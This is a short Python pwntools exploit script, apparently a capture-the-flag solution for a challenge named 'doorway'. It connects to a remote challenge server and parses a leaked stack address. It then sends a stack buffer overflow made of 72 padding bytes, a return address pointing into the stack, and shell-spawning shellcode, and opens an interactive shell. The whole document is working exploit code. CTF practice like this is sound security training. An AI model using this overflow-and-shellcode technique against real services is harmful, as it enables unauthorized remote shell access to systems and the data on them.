from pwn import *

context.arch = "x86_64"
shellcode = shellcraft.sh()

# p = process("./doorway")
# gdb.attach(p)
p = remote("uithack.td.org.uit.no", 9003)

p.recvuntil(b"Error code: ")
stack = int(p.recvline().strip(), 16) + 80
log.success(f"{hex(stack)=}")

payload = b"A"*72
payload += p64(stack)
payload += asm(shellcode)

p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()

